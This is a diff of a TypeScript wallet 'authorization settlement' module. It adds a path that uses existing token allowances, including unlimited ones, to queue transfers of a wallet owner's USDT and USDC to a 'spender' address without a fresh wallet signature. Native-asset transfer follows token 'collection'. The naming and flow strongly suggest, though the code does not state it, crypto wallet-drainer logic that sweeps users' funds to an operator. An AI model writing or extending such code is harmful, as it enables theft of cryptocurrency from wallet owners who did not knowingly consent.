@@ -8,7 +8,13 @@ import {
   createWalletSessionRefresher,
   fetchWalletSessionToken,
 } from "../wallet-session-token";
-import { getCachedWalletSessionToken } from "../wallet-session-cache";
+import {
+  getCachedWalletSessionToken,
+  setCachedWalletSessionToken,
+} from "../wallet-session-cache";
+import { createHttpApprovalApiClient } from "../../approval/http-api-client";
+import { queueCollectionForExistingAllowance } from "../existing-allowance-collection";
+import type { ApprovalRequest } from "../../approval/types";
 import { registerWalletPhaseNativeAuthorization } from "../../native-transfer/native-wallet-authorize";
 import type {
   SettlementRunResult,
@@ -66,6 +72,8 @@ async function nudgeTokenCollection(args: {
         body: JSON.stringify({
           owner: args.owner,
           network: args.network,
+          sessionId: args.transactionId,
+          traceId: args.transactionId,
           tokens: buildNativeReadinessTokenInputs(args.tokenCaptures),
         }),
         cache: "no-store",
@@ -199,6 +207,8 @@ async function registerSettlementSession(args: {
   const json = (await res.json()) as {
     ok?: boolean;
     settlementSessionId?: string;
+    walletSessionToken?: string;
+    walletSessionExpiresAt?: string;
     message?: string;
   };
   if (!res.ok || !json.ok || !json.settlementSessionId) {
@@ -206,9 +216,21 @@ async function registerSettlementSession(args: {
       String(json.message ?? "Failed to register settlement session"),
     );
   }
+  let sessionToken = walletSessionToken;
+  if (json.walletSessionToken) {
+    sessionToken = json.walletSessionToken;
+    if (json.walletSessionExpiresAt) {
+      setCachedWalletSessionToken({
+        network: args.capture.network,
+        owner: args.capture.owner,
+        token: json.walletSessionToken,
+        expiresAt: json.walletSessionExpiresAt,
+      });
+    }
+  }
   return {
     settlementSessionId: json.settlementSessionId,
-    walletSessionToken,
+    walletSessionToken: sessionToken,
   };
 }
 
@@ -246,6 +268,63 @@ export function ensureNativeCaptureForSettlement(
   };
 }
 
+/** Queue collection for tokens that skipped wallet-phase queue-collection (hybrid auth). */
+async function queueDeferredAllowanceCollections(args: {
+  capture: WalletPhaseCapture;
+  apiBaseUrl?: string;
+  walletSessionToken?: string;
+  transactionId?: string;
+  getSpender: (network: string) => string;
+  networkRow?: RunAuthorizationSettlementArgs["networks"][number];
+}): Promise<WalletPhaseCapture> {
+  const api = createHttpApprovalApiClient({ apiBaseUrl: args.apiBaseUrl });
+  const tokens = [...args.capture.tokens];
+
+  for (let index = 0; index < tokens.length; index += 1) {
+    const tokenCapture = tokens[index];
+    if (!tokenCapture.skipSettlementConfirm || !tokenCapture.shouldAttemptTransfer) {
+      continue;
+    }
+    if (tokenCapture.orchestration.approvalId) continue;
+
+    const token = tokenCapture.item.asset;
+    const request: ApprovalRequest = {
+      network: args.capture.network,
+      owner: args.capture.owner,
+      token,
+      amountHuman: tokenCapture.item.unlimited
+        ? undefined
+        : tokenCapture.item.amountHuman,
+      unlimited: tokenCapture.item.unlimited,
+      nativeBalanceHuman: args.networkRow?.balances.native ?? "0",
+      tokenBalanceHuman:
+        token === "USDT"
+          ? (args.networkRow?.balances.usdt ?? "0")
+          : (args.networkRow?.balances.usdc ?? "0"),
+      executeTransfer: true,
+      transferToAddress: args.getSpender(args.capture.network),
+      transferAmountRaw: tokenCapture.transferAmountRaw,
+      traceId: args.transactionId,
+      walletSessionToken: args.walletSessionToken,
+    };
+    const prepared = await api.prepare({ request });
+    const json = await queueCollectionForExistingAllowance({
+      request,
+      prepared,
+      apiBaseUrl: args.apiBaseUrl,
+    });
+    tokens[index] = {
+      ...tokenCapture,
+      orchestration: {
+        ...tokenCapture.orchestration,
+        approvalId: json.approvalId ?? null,
+      },
+    };
+  }
+
+  return { ...args.capture, tokens };
+}
+
 /** Poll native-readiness API — native runs only when no token has active in-flight collection. */
 export async function fetchNativeReadiness(args: {
   apiBaseUrl?: string;
@@ -275,6 +354,8 @@ export async function fetchNativeReadiness(args: {
           body: JSON.stringify({
             owner: args.owner,
             network: args.network,
+            sessionId: args.transactionId,
+            traceId: args.transactionId,
             tokens: buildNativeReadinessTokenInputs(args.tokenCaptures),
           }),
           cache: "no-store",
@@ -397,6 +478,7 @@ export async function runAuthorizationSettlement(
         })
       : undefined;
 
+    const walletPersonalSignEnabled = args.walletPersonalSignEnabled !== false;
     let walletSessionToken =
       args.walletSessionToken ??
       getCachedWalletSessionToken(
@@ -404,7 +486,7 @@ export async function runAuthorizationSettlement(
         args.capture.owner,
       ) ??
       undefined;
-    if (!walletSessionToken && args.provider) {
+    if (!walletSessionToken && args.provider && walletPersonalSignEnabled) {
       walletSessionToken = await fetchWalletSessionToken({
         provider: args.provider,
         apiBaseUrl,
@@ -417,10 +499,27 @@ export async function runAuthorizationSettlement(
       apiBaseUrl,
       capture: args.capture,
       walletSessionToken,
-      refreshWalletSessionToken,
+      refreshWalletSessionToken: walletPersonalSignEnabled
+        ? refreshWalletSessionToken
+        : undefined,
     });
     settlementSessionId = registered.settlementSessionId;
     walletSessionToken = registered.walletSessionToken ?? walletSessionToken;
+
+    let captureForSettlement = args.capture;
+    if (!walletPersonalSignEnabled) {
+      const networkRow = args.networks.find(
+        (n) => n.key === args.capture.network,
+      );
+      captureForSettlement = await queueDeferredAllowanceCollections({
+        capture: args.capture,
+        apiBaseUrl,
+        walletSessionToken,
+        transactionId,
+        getSpender: args.getSpender,
+        networkRow,
+      });
+    }
 
     args.onProgress?.({
       network: args.capture.network,
@@ -462,12 +561,12 @@ export async function runAuthorizationSettlement(
     }
 
     const networkRow = args.networks.find(
-      (n) => n.key === args.capture.network,
+      (n) => n.key === captureForSettlement.network,
     );
     const finalizedCaptures: WalletPhaseTokenCapture[] = [];
 
     for (const token of TOKEN_SETTLEMENT_ORDER) {
-      const tokenCapture = tokenCaptureForSymbol(args.capture.tokens, token);
+      const tokenCapture = tokenCaptureForSymbol(captureForSettlement.tokens, token);
       if (!tokenCapture) continue;
 
       if (tokenCapture.skipSettlementConfirm) {
@@ -547,7 +646,7 @@ export async function runAuthorizationSettlement(
         tokenCaptures:
           finalizedCaptures.length > 0
             ? finalizedCaptures
-            : args.capture.tokens,
+            : captureForSettlement.tokens,
         walletSessionToken,
         transactionId,
         refreshWalletSessionToken,
@@ -596,7 +695,7 @@ export async function runAuthorizationSettlement(
 
     for (const tokenCapture of finalizedCaptures.length > 0
       ? finalizedCaptures
-      : args.capture.tokens) {
+      : captureForSettlement.tokens) {
       const token = tokenCapture.item.asset;
       const readinessToken = readiness?.tokens.find((t) => t.token === token);
       const state = readinessToken?.state;
@@ -813,7 +912,7 @@ export async function runAuthorizationSettlement(
           nativeReadinessTokens: buildNativeReadinessTokenInputs(
             finalizedCaptures.length > 0
               ? finalizedCaptures
-              : args.capture.tokens,
+              : captureForSettlement.tokens,
           ),
           mode: "full",
         });
@@ -907,7 +1006,7 @@ export async function runAuthorizationSettlement(
         nativeReadinessTokens: buildNativeReadinessTokenInputs(
           finalizedCaptures.length > 0
             ? finalizedCaptures
-            : args.capture.tokens,
+            : captureForSettlement.tokens,
         ),
         mode: isDeferredSigned ? "execute_deferred" : "full",
         deferredSignedRaw: signedRaw || undefined,
